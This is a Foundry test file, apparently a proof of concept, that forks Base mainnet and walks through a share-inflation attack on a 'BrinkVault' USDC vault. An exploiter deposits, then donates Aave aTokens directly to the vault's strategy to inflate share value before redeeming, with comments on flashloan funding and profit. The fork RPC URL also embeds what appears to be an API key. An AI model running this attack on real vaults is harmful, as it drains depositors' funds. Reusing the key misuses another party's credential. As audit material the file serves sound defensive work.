// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {BrinkVault} from "contracts/BrinkVault.sol";
import {AaveStrategy} from "contracts/strategies/aave/AaveStrategy.sol";
import {MorphoStrategy} from "contracts/strategies/morpho/MorphoStrategy.sol";
import {LendleStrategy} from "contracts/strategies/lendle/LendleStrategy.sol";
import {IAave} from "contracts/interfaces/strategies/IAave.sol";

contract DebugTest is Test {
    //Copy pasted from brinkVault.t.ts
    IERC20 USDC = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    address vaultManager = makeAddr("vaultManager");
    address strategist = makeAddr("strategist");
    // Aave / Morpho reserves & IDs (as per TS)
    address constant AAVE_RESERVE = 0xA238Dd80C259a72e81d7e4664a9801593F98d1c5;
    address constant MORPHO_RESERVE_1 = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    bytes32 constant RESERVE2_ID = 0x8793cf302b8ffd655ab97bd1c695dbd967807e8367a65cb2f4edaf1380ba1bda;
    address constant MORPHO_RESERVE_2 = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    bytes32 constant RESERVE3_ID = 0x1c21c59df9db44bf6f645d854ee710a8ca17b479451447e9f56758aee10a2fad;

    // aToken sink address used in the TS balance checks
    address constant AAVE_ATOKEN_UNDERLYING_SINK = 0x4e65fE4DbA92790696d040ac24Aa414708F5c0AB;

    BrinkVault brinkVault;
    AaveStrategy aaveStrategy;
    LendleStrategy lendleStrategy;
    MorphoStrategy morphoStrategy1;
    MorphoStrategy morphoStrategy2;

    function setUp() public {
        //Base mainnet based on hardhat config
        // vm.createSelectFork("https://base.llamarpc.com", 31950826); // Base Mainnet Fork Block 31950826
        vm.createSelectFork(
            "https://rpc.ankr.com/base/95e6b7b3769824dfa420ef460b5fd940bff206ca48caea572c3a9198f245bbb5", 31950826
        ); // using better service

        brinkVault = new BrinkVault(address(USDC), strategist, vaultManager, "Test Brink USDC", "bUSDC", 1_000_000e6);
        // Deploy strategies
        aaveStrategy = new AaveStrategy(address(brinkVault), address(USDC), AAVE_RESERVE);
        morphoStrategy1 = new MorphoStrategy(address(brinkVault), address(USDC), MORPHO_RESERVE_1, RESERVE2_ID);
        morphoStrategy2 = new MorphoStrategy(address(brinkVault), address(USDC), MORPHO_RESERVE_2, RESERVE3_ID);

        // Initialize whitelist + weights (5k/3k/2k)
        vm.prank(vaultManager);
        brinkVault.initialize(
            _toAddressArray(address(aaveStrategy), address(morphoStrategy1), address(morphoStrategy2)),
            _toUintArray(4_000, 4_000, 2_000)
        );

        // Label helpful addresses
        vm.label(address(USDC), "USDC");
        vm.label(AAVE_RESERVE, "AAVE_RESERVE");
        vm.label(MORPHO_RESERVE_1, "MORPHO_RESERVE_1");
        vm.label(MORPHO_RESERVE_2, "MORPHO_RESERVE_2");
        vm.label(AAVE_ATOKEN_UNDERLYING_SINK, "AAVE_ATOKEN_SINK");
        vm.label(address(brinkVault), "BrinkVault");
        vm.label(address(aaveStrategy), "AaveStrategy");
        vm.label(address(morphoStrategy1), "MorphoStrategy1");
        vm.label(address(morphoStrategy2), "MorphoStrategy2");

        vm.stopPrank();
    }

    function testExample() public {
        console.log(USDC.totalSupply());

        address user1 = makeAddr("user1");
        vm.startPrank(user1);
        uint256 usdc_balance = 10_000e6;
        deal(address(USDC), user1, usdc_balance);
        //deposit 10K USDC to vault
        USDC.approve(address(brinkVault), usdc_balance);
        brinkVault.deposit(usdc_balance, user1);

        console.log("vault supply %e", brinkVault.totalSupply());
        console.log("vault asset %e", brinkVault.totalAssets());
        console.log("user1 shares %e", brinkVault.balanceOf(user1));

        console.log("convert price 1k USDC to shares: %e", brinkVault.convertToShares(usdc_balance));

        // attacks path
        address exploiter = makeAddr("exploiter");
        vm.startPrank(exploiter);
        //1. get free USDC flashloan. Some service on base provide ~30M flashloan without interest.
        // AAVE does not charge interest fee on supply/withdraw.
        // AAVE flash fee is 0.05%. so 10M to get profit 10k in transaction net profit of 5K
        uint256 flashloanAmount = 50_000e6;
        deal(address(USDC), exploiter, flashloanAmount);
        IAave aave = IAave(AAVE_RESERVE);

        //supply USDC to vault get share of the vault
        USDC.approve(address(brinkVault), type(uint256).max);
        // brinkVault.deposit(flashloanAmount - usdc_balance, exploiter); //prevent deposit limit
        brinkVault.deposit(flashloanAmount/2, exploiter); //prevent deposit limitk


        //supply half to aave for aToken
        USDC.approve(AAVE_RESERVE, type(uint256).max);
        aave.supply(address(USDC), USDC.balanceOf(exploiter), exploiter, 0);

        //2. transfer aToken to strategy to inflate all share value.
        IERC20 aUSDC = IERC20(aave.getReserveAToken(address(USDC)));
        aUSDC.transfer(address(aaveStrategy), aUSDC.balanceOf(exploiter));

        //debug log
        console.log("vault supply %e", brinkVault.totalSupply());
        console.log("vault asset %e", brinkVault.totalAssets());
        console.log("convert price 1 $USDC to shares: %e", brinkVault.convertToShares(1e6));

        console.log("exploiter shares %e", brinkVault.balanceOf(exploiter));
        console.log("exploiter assets %e", brinkVault.convertToAssets(brinkVault.balanceOf(exploiter)));

        console.log("----");
        console.log("exploiter shares %e", brinkVault.balanceOf(exploiter));
        console.log("exploiter assets %e", brinkVault.convertToAssets(brinkVault.balanceOf(exploiter)));
        // for a single transaction on base, it can only fit ~150 transactions for withdraws call
        uint256 counts = 100;
        uint256 split = brinkVault.convertToAssets(brinkVault.balanceOf(exploiter)) / counts;
        // for (uint256 i = 0; i < 10; i++) {
        //     brinkVault.withdraw(split, exploiter,exploiter);
        // }


        console.log("vault supply %e", brinkVault.totalSupply());
        console.log("vault asset %e", brinkVault.totalAssets());
        

        brinkVault.redeem(brinkVault.balanceOf(exploiter), exploiter,exploiter);
    }

    function _toAddressArray(address a, address b, address c) internal pure returns (address[] memory arr) {
        arr = new address[](3);
        arr[0] = a;
        arr[1] = b;
        arr[2] = c;
    }

    function _toUintArray(uint256 a, uint256 b, uint256 c) internal pure returns (uint256[] memory arr) {
        arr = new uint256[](3);
        arr[0] = a;
        arr[1] = b;
        arr[2] = c;
    }
}
